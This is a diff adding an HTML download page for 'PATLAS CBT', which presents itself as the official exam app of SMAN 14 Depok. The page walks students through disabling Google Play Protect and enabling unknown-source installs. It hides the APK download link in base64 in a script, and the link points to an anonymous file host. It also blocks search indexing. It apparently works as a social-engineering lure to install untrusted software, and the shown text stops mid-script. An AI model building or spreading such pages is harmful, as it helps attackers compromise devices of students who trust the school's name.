@@ -1,0 +1,933 @@
+<!DOCTYPE html>
+<html lang="id" data-theme="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="PATLAS — Platform Ujian Online SMAN 14 Depok">
+<meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
+<meta http-equiv="X-Robots-Tag" content="noindex">
+<title>PATLAS — SMAN 14 Depok</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+
+:root{
+--bg:#08090d;
+--bg2:#0e1018;
+--surface:rgba(255,255,255,0.04);
+--surface2:rgba(255,255,255,0.07);
+--border:rgba(255,255,255,0.08);
+--border2:rgba(255,255,255,0.14);
+--text:#f0f2ff;
+--text2:#9ba3c4;
+--text3:#5a6180;
+--accent:#4f8bff;
+--accent2:#7ba8ff;
+--accent-glow:rgba(79,139,255,0.25);
+--red:#ff5c7a;
+--green:#22d68a;
+--yellow:#ffba2e;
+--shadow:rgba(0,0,10,0.6);
+}
+
+[data-theme="light"]{
+--bg:#f4f5fa;
+--bg2:#ecedf5;
+--surface:rgba(0,0,0,0.04);
+--surface2:rgba(0,0,0,0.07);
+--border:rgba(0,0,0,0.09);
+--border2:rgba(0,0,0,0.15);
+--text:#0d1033;
+--text2:#3d4466;
+--text3:#8890b0;
+--accent:#2968f5;
+--accent2:#1a52d8;
+--accent-glow:rgba(41,104,245,0.18);
+--red:#e8234a;
+--green:#12b870;
+--yellow:#e89b00;
+--shadow:rgba(0,0,40,0.1);
+}
+
+html{scroll-behavior:smooth}
+
+body{
+font-family:'DM Sans',sans-serif;
+background:var(--bg);
+color:var(--text);
+min-height:100vh;
+overflow-x:hidden;
+transition:background 0.3s,color 0.3s;
+}
+
+body::before{
+content:'';position:fixed;inset:0;
+background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.04'/%3E%3C/svg%3E");
+pointer-events:none;z-index:0;opacity:0.6;
+}
+
+.ambient{position:fixed;pointer-events:none;border-radius:50%;filter:blur(100px);z-index:0}
+.ambient-1{width:600px;height:400px;background:radial-gradient(circle,rgba(79,139,255,0.08) 0%,transparent 70%);top:-100px;left:-100px}
+.ambient-2{width:500px;height:500px;background:radial-gradient(circle,rgba(120,80,255,0.06) 0%,transparent 70%);bottom:-150px;right:-50px}
+[data-theme="light"] .ambient-1{background:radial-gradient(circle,rgba(41,104,245,0.07) 0%,transparent 70%)}
+[data-theme="light"] .ambient-2{background:radial-gradient(circle,rgba(120,80,255,0.05) 0%,transparent 70%)}
+
+.top-bar{
+position:fixed;top:0;left:0;right:0;z-index:100;
+display:flex;align-items:center;justify-content:space-between;
+padding:14px 20px;
+backdrop-filter:blur(14px);
+background:rgba(8,9,13,0.6);
+border-bottom:1px solid var(--border);
+}
+[data-theme="light"] .top-bar{background:rgba(244,245,250,0.7);}
+
+.top-bar-left{display:flex;align-items:center;gap:10px;}
+.top-school-logo{width:30px;height:30px;border-radius:8px;object-fit:contain;}
+.top-school-logo-fallback{
+width:30px;height:30px;border-radius:8px;
+background:linear-gradient(135deg,#4f8bff,#7c6fff);
+display:flex;align-items:center;justify-content:center;
+font-family:'Syne',sans-serif;font-weight:800;font-size:11px;color:#fff;
+}
+.top-school-name{font-family:'Syne',sans-serif;font-weight:700;font-size:13px;color:var(--text);}
+.top-bar-right{display:flex;align-items:center;gap:10px;}
+
+.lang-toggle{
+display:flex;align-items:center;gap:0;
+background:var(--surface2);border:1px solid var(--border2);
+border-radius:100px;overflow:hidden;
+}
+.lang-btn{
+padding:5px 13px;font-size:12px;font-weight:600;cursor:pointer;
+background:transparent;border:none;color:var(--text3);
+transition:all 0.2s;font-family:'DM Sans',sans-serif;
+}
+.lang-btn.active{background:var(--accent);color:#fff;}
+
+.theme-toggle{
+width:36px;height:36px;border-radius:50%;
+background:var(--surface2);border:1px solid var(--border2);
+cursor:pointer;display:flex;align-items:center;justify-content:center;
+font-size:16px;transition:all 0.2s;backdrop-filter:blur(10px);
+}
+.theme-toggle:hover{transform:scale(1.1);border-color:var(--accent)}
+
+.wrapper{
+position:relative;z-index:1;
+min-height:100vh;
+display:flex;flex-direction:column;align-items:center;
+padding:100px 20px 60px;
+gap:0;
+}
+
+.school-hero{
+display:flex;flex-direction:column;align-items:center;gap:10px;
+margin-bottom:28px;
+animation:fadeDown 0.6s ease both;
+}
+.school-logo-img{
+width:72px;height:72px;border-radius:18px;object-fit:contain;
+border:1px solid var(--border2);
+box-shadow:0 8px 32px rgba(79,139,255,0.18);
+background:var(--surface2);
+}
+.school-logo-fallback{
+width:72px;height:72px;border-radius:18px;
+background:linear-gradient(135deg,#1a2a6c,#4f8bff);
+display:flex;align-items:center;justify-content:center;
+font-family:'Syne',sans-serif;font-weight:800;font-size:22px;color:#fff;
+border:1px solid rgba(79,139,255,0.3);
+box-shadow:0 8px 32px rgba(79,139,255,0.2);
+}
+.school-name-text{
+font-family:'Syne',sans-serif;font-weight:800;font-size:17px;color:var(--text);
+text-align:center;letter-spacing:-0.3px;
+}
+.school-sub-text{font-size:12px;color:var(--text3);text-align:center;}
+
+.card{
+width:100%;max-width:460px;
+background:var(--surface);
+border:1px solid var(--border2);
+border-radius:24px;
+padding:36px 32px;
+backdrop-filter:blur(20px);
+box-shadow:0 24px 80px var(--shadow);
+animation:fadeUp 0.7s 0.1s ease both;
+position:relative;overflow:hidden;
+}
+.card::before{
+content:'';position:absolute;
+top:0;left:0;right:0;height:1px;
+background:linear-gradient(90deg,transparent,var(--accent),transparent);
+opacity:0.5;
+}
+
+.app-icon-wrap{display:flex;justify-content:center;margin-bottom:22px;}
+.app-icon{
+width:80px;height:80px;border-radius:20px;
+background:linear-gradient(145deg,#1a2a6c,#2d4fc0,#4f8bff);
+display:flex;align-items:center;justify-content:center;
+box-shadow:0 8px 32px rgba(79,139,255,0.35),0 0 0 1px rgba(79,139,255,0.2);
+position:relative;
+}
+.app-icon svg{width:40px;height:40px;fill:#fff}
+.app-icon::after{
+content:'';position:absolute;inset:0;border-radius:20px;
+background:linear-gradient(145deg,rgba(255,255,255,0.15),transparent);
+}
+
+.app-name{
+font-family:'Syne',sans-serif;font-weight:800;font-size:24px;
+text-align:center;color:var(--text);letter-spacing:-0.5px;margin-bottom:5px;
+}
+.app-sub{
+font-size:13px;color:var(--text2);text-align:center;
+font-weight:400;margin-bottom:24px;line-height:1.5;
+}
+
+.meta-row{
+display:flex;gap:8px;justify-content:center;flex-wrap:wrap;margin-bottom:28px;
+}
+.meta-tag{
+display:flex;align-items:center;gap:6px;
+padding:5px 11px;border-radius:100px;
+background:var(--surface2);border:1px solid var(--border);
+font-size:12px;color:var(--text2);font-weight:500;
+}
+.meta-tag svg{width:13px;height:13px;opacity:0.7;flex-shrink:0}
+
+.divider{height:1px;background:var(--border);margin:24px 0;}
+
+.req-title{
+font-size:11px;font-weight:600;letter-spacing:0.08em;text-transform:uppercase;
+color:var(--text3);margin-bottom:12px;
+}
+.req-list{list-style:none;display:flex;flex-direction:column;gap:8px;margin-bottom:0}
+.req-list li{
+display:flex;align-items:center;gap:10px;
+font-size:13px;color:var(--text2);
+}
+.req-list li svg{width:15px;height:15px;flex-shrink:0;color:var(--green)}
+
+.btn-install{
+width:100%;padding:15px 24px;border-radius:14px;
+background:linear-gradient(135deg,#2d5fd4,#4f8bff);
+border:none;color:#fff;cursor:pointer;
+font-family:'Syne',sans-serif;font-weight:700;font-size:15px;
+display:flex;align-items:center;justify-content:center;gap:10px;
+box-shadow:0 4px 24px rgba(79,139,255,0.38);
+transition:all 0.25s;position:relative;overflow:hidden;
+letter-spacing:0.02em;
+}
+.btn-install:hover{transform:translateY(-2px);box-shadow:0 8px 36px rgba(79,139,255,0.5)}
+.btn-install:active{transform:translateY(0)}
+.btn-install::after{
+content:'';position:absolute;inset:0;
+background:linear-gradient(180deg,rgba(255,255,255,0.12),transparent);
+pointer-events:none;
+}
+.btn-install svg{width:18px;height:18px;flex-shrink:0}
+.btn-install:disabled{opacity:0.55;cursor:not-allowed;transform:none;box-shadow:0 4px 16px rgba(79,139,255,0.2);}
+
+.notice{
+margin-top:14px;padding:12px 14px;border-radius:10px;
+font-size:12.5px;line-height:1.55;
+display:none;align-items:flex-start;gap:10px;
+}
+.notice.show{display:flex}
+.notice.error{background:rgba(255,92,122,0.08);border:1px solid rgba(255,92,122,0.2);color:var(--red)}
+.notice.info{background:rgba(79,139,255,0.07);border:1px solid rgba(79,139,255,0.2);color:var(--accent2)}
+.notice.success{background:rgba(34,214,138,0.07);border:1px solid rgba(34,214,138,0.2);color:var(--green)}
+.notice svg{width:15px;height:15px;flex-shrink:0;margin-top:1px}
+
+.progress-wrap{margin-top:14px;display:none;}
+.progress-wrap.show{display:block}
+.progress-label{font-size:12px;color:var(--text3);margin-bottom:8px;display:flex;justify-content:space-between}
+.progress-bar{height:4px;background:var(--surface2);border-radius:100px;overflow:hidden}
+.progress-fill{height:100%;background:linear-gradient(90deg,#4f8bff,#a78bfa);border-radius:100px;width:0%;transition:width 0.4s ease}
+
+.footer-note{
+margin-top:20px;text-align:center;font-size:12px;
+color:var(--text3);line-height:1.6;
+}
+.footer-note a{color:var(--accent2);text-decoration:none}
+.footer-note a:hover{text-decoration:underline}
+
+.steps{display:flex;flex-direction:column;gap:6px;margin-top:14px;display:none;}
+.steps.show{display:flex}
+.step{
+display:flex;align-items:center;gap:10px;
+font-size:12.5px;color:var(--text3);padding:8px 10px;
+border-radius:8px;transition:all 0.3s;
+}
+.step.active{color:var(--text2);background:var(--surface2)}
+.step.done{color:var(--green)}
+.step-num{
+width:18px;height:18px;border-radius:50%;
+background:var(--surface2);border:1px solid var(--border2);
+display:flex;align-items:center;justify-content:center;
+font-size:10px;font-weight:700;flex-shrink:0;
+}
+.step.active .step-num{background:var(--accent);border-color:var(--accent);color:#fff}
+.step.done .step-num{background:var(--green);border-color:var(--green);color:#fff}
+
+/* ── TUTORIAL SECTION ── */
+.tutorial-section{
+width:100%;max-width:460px;
+margin-top:28px;
+animation:fadeUp 0.7s 0.25s ease both;
+}
+
+.tutorial-header{
+display:flex;align-items:center;justify-content:space-between;
+margin-bottom:18px;flex-wrap:wrap;gap:10px;
+}
+.tutorial-title-wrap{display:flex;flex-direction:column;gap:3px;}
+.tutorial-pretitle{
+font-size:10px;font-weight:700;letter-spacing:0.12em;text-transform:uppercase;
+color:var(--accent);
+}
+.tutorial-title{
+font-family:'Syne',sans-serif;font-weight:800;font-size:18px;
+color:var(--text);letter-spacing:-0.3px;
+}
+.tutorial-sub{font-size:12px;color:var(--text3);margin-top:2px;}
+
+.warning-banner{
+background:rgba(255,186,46,0.07);
+border:1px solid rgba(255,186,46,0.25);
+border-radius:12px;
+padding:12px 16px;
+margin-bottom:20px;
+display:flex;align-items:flex-start;gap:10px;
+font-size:12.5px;color:var(--yellow);
+line-height:1.55;
+}
+.warning-banner svg{width:16px;height:16px;flex-shrink:0;margin-top:1px;}
+
+/* Step cards */
+.step-cards{display:flex;flex-direction:column;gap:14px;}
+
+.step-card{
+background:var(--surface);
+border:1px solid var(--border2);
+border-radius:18px;
+overflow:hidden;
+transition:border-color 0.2s,box-shadow 0.2s;
+}
+.step-card:hover{
+border-color:rgba(79,139,255,0.3);
+box-shadow:0 4px 24px rgba(79,139,255,0.08);
+}
+
+.step-card-header{
+display:flex;align-items:flex-start;gap:14px;
+padding:18px 18px 14px;
+}
+.step-badge{
+min-width:36px;height:36px;border-radius:10px;
+background:linear-gradient(135deg,#2d5fd4,#4f8bff);
+display:flex;align-items:center;justify-content:center;
+font-family:'Syne',sans-serif;font-weight:800;font-size:14px;color:#fff;
+box-shadow:0 4px 12px rgba(79,139,255,0.3);
+flex-shrink:0;
+}
+.step-card.last-step .step-badge{
+background:linear-gradient(135deg,#12b870,#22d68a);
+box-shadow:0 4px 12px rgba(34,214,138,0.3);
+}
+.step-card-text{flex:1;}
+.step-card-label{
+font-size:10px;font-weight:700;letter-spacing:0.08em;text-transform:uppercase;
+color:var(--text3);margin-bottom:3px;
+}
+.step-card-desc{
+font-size:14px;font-weight:500;color:var(--text);line-height:1.5;
+}
+.step-card-note{
+font-size:12px;color:var(--text2);margin-top:4px;line-height:1.5;
+}
+
+.step-img-wrap{
+margin:0 14px 14px;
+border-radius:12px;overflow:hidden;
+background:var(--surface2);
+border:1px solid var(--border);
+position:relative;
+}
+.step-img-wrap img{
+width:100%;height:auto;max-height:280px;
+object-fit:cover;display:block;
+}
+.step-img-fallback{
+width:100%;height:160px;
+display:flex;flex-direction:column;align-items:center;justify-content:center;
+gap:8px;color:var(--text3);font-size:12px;font-family:'DM Sans',sans-serif;
+}
+.step-img-fallback svg{width:32px;height:32px;opacity:0.3;}
+
+.step-complete-banner{
+background:rgba(34,214,138,0.07);
+border:1px solid rgba(34,214,138,0.2);
+border-radius:12px;
+padding:16px 18px;
+display:flex;align-items:center;gap:12px;
+font-size:13.5px;color:var(--green);font-weight:500;
+margin-top:6px;
+}
+.step-complete-banner svg{width:20px;height:20px;flex-shrink:0;}
+
+.credits{
+margin-top:32px;text-align:center;font-size:12px;
+color:var(--text3);
+animation:fadeUp 0.7s 0.4s ease both;
+padding-bottom:20px;
+}
+
+@keyframes fadeUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
+@keyframes fadeDown{from{opacity:0;transform:translateY(-16px)}to{opacity:1;transform:translateY(0)}}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+.spinner{
+width:16px;height:16px;border:2px solid rgba(255,255,255,0.3);
+border-top-color:#fff;border-radius:50%;
+animation:spin 0.7s linear infinite;flex-shrink:0;
+}
+
+@media(max-width:480px){
+.card{padding:28px 20px;}
+.tutorial-section{padding:0 0;}
+.step-card-desc{font-size:13px;}
+}
+</style>
+</head>
+<body>
+
+<div class="ambient ambient-1"></div>
+<div class="ambient ambient-2"></div>
+
+<!-- TOP BAR -->
+<div class="top-bar">
+  <div class="top-bar-left">
+    <img src="logo.png" alt="Logo SMAN 14" class="top-school-logo" onerror="this.style.display='none';this.nextElementSibling.style.display='flex'">
+    <div class="top-school-logo-fallback" style="display:none">14</div>
+    <span class="top-school-name" data-id="topSchoolName">SMAN 14 Depok</span>
+  </div>
+  <div class="top-bar-right">
+    <div class="lang-toggle">
+      <button class="lang-btn active" id="btnID" onclick="setLang('id')">ID</button>
+      <button class="lang-btn" id="btnEN" onclick="setLang('en')">EN</button>
+    </div>
+    <button class="theme-toggle" onclick="toggleTheme()" title="Ganti tema">
+      <span id="themeIcon">☀️</span>
+    </button>
+  </div>
+</div>
+
+<div class="wrapper">
+
+  <!-- SCHOOL HERO -->
+  <div class="school-hero">
+    <img src="logo.png" alt="Logo SMAN 14 Depok" class="school-logo-img"
+      onerror="this.style.display='none';this.nextElementSibling.style.display='flex'">
+    <div class="school-logo-fallback" style="display:none">14</div>
+    <div class="school-name-text" data-id="heroSchoolName">SMAN 14 Depok</div>
+    <div class="school-sub-text" data-id="heroSchoolSub">Depok, Jawa Barat — Official</div>
+  </div>
+
+  <!-- INSTALL CARD -->
+  <div class="card">
+
+    <div class="app-icon-wrap">
+      <div class="app-icon">
+        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <path d="M9 11H7v2h2v-2zm4 0h-2v2h2v-2zm4 0h-2v2h2v-2zm2-7h-1V2h-2v2H8V2H6v2H5c-1.1 0-1.99.9-1.99 2L3 20c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 16H5V9h14v11z"/>
+        </svg>
+      </div>
+    </div>
+
+    <h1 class="app-name">PATLAS CBT</h1>
+    <p class="app-sub" data-id="appSub">Aplikasi Ujian &amp; Ulangan Harian Online<br>SMAN 14 Depok</p>
+
+    <div class="meta-row">
+      <span class="meta-tag">
+        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M17 1.01 7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14z"/></svg>
+        Android Only
+      </span>
+      <span class="meta-tag">
+        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14H9V8h2v8zm4 0h-2V8h2v8z"/></svg>
+        <span data-id="metaVersion">Versi Terbaru</span>
+      </span>
+      <span class="meta-tag">
+        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M18 15v3H6v-3H4v3c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2v-3h-2zm-1-4-1.41-1.41L13 12.17V4h-2v8.17L8.41 9.59 7 11l5 5 5-5z"/></svg>
+        Free
+      </span>
+    </div>
+
+    <div class="divider"></div>
+
+    <p class="req-title" data-id="reqTitle">Persyaratan</p>
+    <ul class="req-list">
+      <li>
+        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M9 16.17 4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+        <span data-id="req1">Perangkat Android (versi 6.0+)</span>
+      </li>
+      <li>
+        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M9 16.17 4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+        <span data-id="req2">Aktifkan "Instal dari Sumber Tidak Dikenal"</span>
+      </li>
+      <li>
+        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M9 16.17 4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+        <span data-id="req3">Koneksi internet untuk login</span>
+      </li>
+    </ul>
+
+    <div class="divider"></div>
+
+    <button class="btn-install" id="btnInstall" onclick="handleInstall()">
+      <svg viewBox="0 0 24 24" fill="currentColor"><path d="M18 15v3H6v-3H4v3c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2v-3h-2zm-1-4-1.41-1.41L13 12.17V4h-2v8.17L8.41 9.59 7 11l5 5 5-5z"/></svg>
+      <span data-id="btnInstallText">Download &amp; Install APK</span>
+    </button>
+
+    <div class="notice" id="notice">
+      <svg viewBox="0 0 24 24" fill="currentColor" id="noticeIcon"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+      <span id="noticeText"></span>
+    </div>
+
+    <div class="progress-wrap" id="progressWrap">
+      <div class="progress-label">
+        <span id="progressLabel">Menyiapkan download...</span>
+        <span id="progressPct">0%</span>
+      </div>
+      <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+    </div>
+
+    <div class="steps" id="steps">
+      <div class="step" id="step1">
+        <div class="step-num">1</div>
+        <span data-id="dlStep1">Mengecek perangkat...</span>
+      </div>
+      <div class="step" id="step2">
+        <div class="step-num">2</div>
+        <span data-id="dlStep2">Menghubungi server...</span>
+      </div>
+      <div class="step" id="step3">
+        <div class="step-num">3</div>
+        <span data-id="dlStep3">Memulai download APK...</span>
+      </div>
+    </div>
+
+    <p class="footer-note">
+      <span data-id="footerNote">Dengan mengunduh, kamu setuju dengan</span><br>
+      <a href="#" data-id="footerLink">Kebijakan Penggunaan</a> SMAN 14 Depok.
+    </p>
+
+  </div>
+
+  <!-- ── TUTORIAL: NONAKTIFKAN PLAY PROTECT ── -->
+  <div class="tutorial-section">
+
+    <div class="tutorial-header">
+      <div class="tutorial-title-wrap">
+        <div class="tutorial-pretitle" data-id="tutPre">Sebelum Menginstal</div>
+        <div class="tutorial-title" data-id="tutTitle">Nonaktifkan Play Protect</div>
+        <div class="tutorial-sub" data-id="tutSub">Ikuti langkah berikut agar instalasi berhasil</div>
+      </div>
+    </div>
+
+    <div class="warning-banner">
+      <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2 1 21h22L12 2zm1 16h-2v-2h2v2zm0-4h-2V9h2v6z"/></svg>
+      <span data-id="warningText">Play Protect perlu dinonaktifkan sementara agar APK resmi sekolah ini bisa terinstal. Aktifkan kembali setelah proses instalasi selesai.</span>
+    </div>
+
+    <div class="step-cards">
+
+      <!-- STEP 1 -->
+      <div class="step-card">
+        <div class="step-card-header">
+          <div class="step-badge">1</div>
+          <div class="step-card-text">
+            <div class="step-card-label" data-id="stepLabel">Langkah 1 dari 7</div>
+            <div class="step-card-desc" data-id="tut1Title">Buka Google Play Store</div>
+            <div class="step-card-note" data-id="tut1Note">Cari ikon Play Store di layar utama atau laci aplikasi, lalu tap untuk membukanya.</div>
+          </div>
+        </div>
+        <div class="step-img-wrap">
+          <img src="step1.jpg" alt="Step 1 - Buka Play Store"
+            onerror="this.style.display='none';this.nextElementSibling.style.display='flex'">
+          <div class="step-img-fallback" style="display:none">
+            <svg viewBox="0 0 24 24" fill="currentColor"><path d="M21 19V5c0-1.1-.9-2-2-2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2zM8.5 13.5l2.5 3.01L14.5 12l4.5 6H5l3.5-4.5z"/></svg>
+            <span data-id="imgFallback">Gambar: step1.jpg</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- STEP 2 -->
+      <div class="step-card">
+        <div class="step-card-header">
+          <div class="step-badge">2</div>
+          <div class="step-card-text">
+            <div class="step-card-label" data-id="stepLabel">Langkah 2 dari 7</div>
+            <div class="step-card-desc" data-id="tut2Title">Tap foto profil kamu</div>
+            <div class="step-card-note" data-id="tut2Note">Di pojok kanan atas Play Store, tap ikon foto profil atau inisial akun Google kamu.</div>
+          </div>
+        </div>
+        <div class="step-img-wrap">
+          <img src="step2.jpg" alt="Step 2 - Tap profil"
+            onerror="this.style.display='none';this.nextElementSibling.style.display='flex'">
+          <div class="step-img-fallback" style="display:none">
+            <svg viewBox="0 0 24 24" fill="currentColor"><path d="M21 19V5c0-1.1-.9-2-2-2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2zM8.5 13.5l2.5 3.01L14.5 12l4.5 6H5l3.5-4.5z"/></svg>
+            <span>Gambar: step2.jpg</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- STEP 3 -->
+      <div class="step-card">
+        <div class="step-card-header">
+          <div class="step-badge">3</div>
+          <div class="step-card-text">
+            <div class="step-card-label">Langkah 3 dari 7</div>
+            <div class="step-card-desc" data-id="tut3Title">Cari dan tap "Play Protect"</div>
+            <div class="step-card-note" data-id="tut3Note">Di menu yang muncul, scroll dan cari opsi <strong>Play Protect</strong>, lalu tap.</div>
+          </div>
+        </div>
+        <div class="step-img-wrap">
+          <img src="step3.jpg" alt="Step 3 - Play Protect"
+            onerror="this.style.display='none';this.nextElementSibling.style.display='flex'">
+          <div class="step-img-fallback" style="display:none">
+            <svg viewBox="0 0 24 24" fill="currentColor"><path d="M21 19V5c0-1.1-.9-2-2-2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2zM8.5 13.5l2.5 3.01L14.5 12l4.5 6H5l3.5-4.5z"/></svg>
+            <span>Gambar: step3.jpg</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- STEP 4 -->
+      <div class="step-card">
+        <div class="step-card-header">
+          <div class="step-badge">4</div>
+          <div class="step-card-text">
+            <div class="step-card-label">Langkah 4 dari 7</div>
+            <div class="step-card-desc" data-id="tut4Title">Tap ikon ⚙️ Settings di kanan atas</div>
+            <div class="step-card-note" data-id="tut4Note">Di halaman Play Protect, tap ikon <strong>roda gigi (⚙️)</strong> atau <strong>Settings</strong> yang ada di pojok kanan atas layar.</div>
+          </div>
+        </div>
+        <div class="step-img-wrap">
+          <img src="step4.jpg" alt="Step 4 - Settings"
+            onerror="this.style.display='none';this.nextElementSibling.style.display='flex'">
+          <div class="step-img-fallback" style="display:none">
+            <svg viewBox="0 0 24 24" fill="currentColor"><path d="M21 19V5c0-1.1-.9-2-2-2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2zM8.5 13.5l2.5 3.01L14.5 12l4.5 6H5l3.5-4.5z"/></svg>
+            <span>Gambar: step4.jpg</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- STEP 5 -->
+      <div class="step-card">
+        <div class="step-card-header">
+          <div class="step-badge">5</div>
+          <div class="step-card-text">
+            <div class="step-card-label">Langkah 5 dari 7</div>
+            <div class="step-card-desc" data-id="tut5Title">Nonaktifkan kedua toggle switch</div>
+            <div class="step-card-note" data-id="tut5Note">Pastikan <strong>kedua toggle switch</strong> di halaman ini benar-benar dalam posisi <strong>OFF (abu-abu)</strong>. Tap masing-masing toggle hingga tidak aktif.</div>
+          </div>
+        </div>
+        <div class="step-img-wrap">
+          <img src="step5.jpg" alt="Step 5 - Toggle Off"
+            onerror="this.style.display='none';this.nextElementSibling.style.display='flex'">
+          <div class="step-img-fallback" style="display:none">
+            <svg viewBox="0 0 24 24" fill="currentColor"><path d="M21 19V5c0-1.1-.9-2-2-2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2zM8.5 13.5l2.5 3.01L14.5 12l4.5 6H5l3.5-4.5z"/></svg>
+            <span>Gambar: step5.jpg</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- STEP 6 -->
+      <div class="step-card">
+        <div class="step-card-header">
+          <div class="step-badge">6</div>
+          <div class="step-card-text">
+            <div class="step-card-label">Langkah 6 dari 7</div>
+            <div class="step-card-desc" data-id="tut6Title">Pilih "Jeda" dan konfirmasi</div>
+            <div class="step-card-note" data-id="tut6Note">Saat muncul dialog konfirmasi, pilih opsi <strong>"Jeda"</strong>. Masukkan <strong>PIN atau sidik jari</strong> jika diminta oleh perangkat.</div>
+          </div>
+        </div>
+        <div class="step-img-wrap">
+          <img src="step6.jpg" alt="Step 6 - Konfirmasi"
+            onerror="this.style.display='none';this.nextElementSibling.style.display='flex'">
+          <div class="step-img-fallback" style="display:none">
+            <svg viewBox="0 0 24 24" fill="currentColor"><path d="M21 19V5c0-1.1-.9-2-2-2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2zM8.5 13.5l2.5 3.01L14.5 12l4.5 6H5l3.5-4.5z"/></svg>
+            <span>Gambar: step6.jpg</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- STEP 7 (LAST) -->
+      <div class="step-card last-step">
+        <div class="step-card-header">
+          <div class="step-badge">7</div>
+          <div class="step-card-text">
+            <div class="step-card-label" data-id="lastStepLabel">Langkah Terakhir</div>
+            <div class="step-card-desc" data-id="tut7Title">Selesai! Siap menginstal APK</div>
+            <div class="step-card-note" data-id="tut7Note">Play Protect sudah berhasil dinonaktifkan sementara. Sekarang kamu bisa kembali ke atas dan tap tombol <strong>Download &amp; Install APK</strong>. Aktifkan kembali Play Protect setelah instalasi selesai.</div>
+          </div>
+        </div>
+        <div class="step-img-wrap">
+          <img src="step7.jpg" alt="Step 7 - Selesai"
+            onerror="this.style.display='none';this.nextElementSibling.style.display='flex'">
+          <div class="step-img-fallback" style="display:none">
+            <svg viewBox="0 0 24 24" fill="currentColor"><path d="M21 19V5c0-1.1-.9-2-2-2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2zM8.5 13.5l2.5 3.01L14.5 12l4.5 6H5l3.5-4.5z"/></svg>
+            <span>Gambar: step7.jpg</span>
+          </div>
+        </div>
+
+        <div class="step-complete-banner" style="margin:0 14px 14px;">
+          <svg viewBox="0 0 24 24" fill="currentColor"><path d="M9 16.17 4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+          <span data-id="completeBanner">Play Protect dinonaktifkan — lanjutkan install APK sekarang!</span>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <div class="credits">
+    PATLAS © 2025 · SMAN 14 Depok · Depok, Jawa Barat
+  </div>
+
+</div>
+
+<script>
+(function(){
+const _s=["aHR0cHM6Ly9maWxlcy5jYXRib3gubW9lLzQybzZhcS5hcGs="];
+window.__getDL=function(){try{return atob(_s[0]);}catch(e){return "";}};
+})();
+
+/* ── TRANSLATIONS ── */
+const T={
+  id:{
+    topSchoolName:"SMAN 14 Depok",
+    heroSchoolName:"SMAN 14 Depok",
+    heroSchoolSub:"Depok, Jawa Barat — Official",
+    appSub:"Aplikasi Ujian & Ulangan Harian Online<br>SMAN 14 Depok",
+    metaVersion:"Versi Terbaru",
+    reqTitle:"Persyaratan",
+    req1:'Perangkat Android (versi 6.0+)',
+    req2:'Aktifkan "Instal dari Sumber Tidak Dikenal"',
+    req3:"Koneksi internet untuk login",
+    btnInstallText:"Download & Install APK",
+    dlStep1:"Mengecek perangkat...",
+    dlStep2:"Menghubungi server...",
+    dlStep3:"Memulai download APK...",
+    footerNote:"Dengan mengunduh, kamu setuju dengan",
+    footerLink:"Kebijakan Penggunaan",
+    tutPre:"Sebelum Menginstal",
+    tutTitle:"Nonaktifkan Play Protect",
+    tutSub:"Ikuti langkah berikut agar instalasi berhasil",
+    warningText:"Play Protect perlu dinonaktifkan sementara agar APK resmi sekolah ini bisa terinstal. Aktifkan kembali setelah proses instalasi selesai.",
+    tut1Title:"Buka Google Play Store",
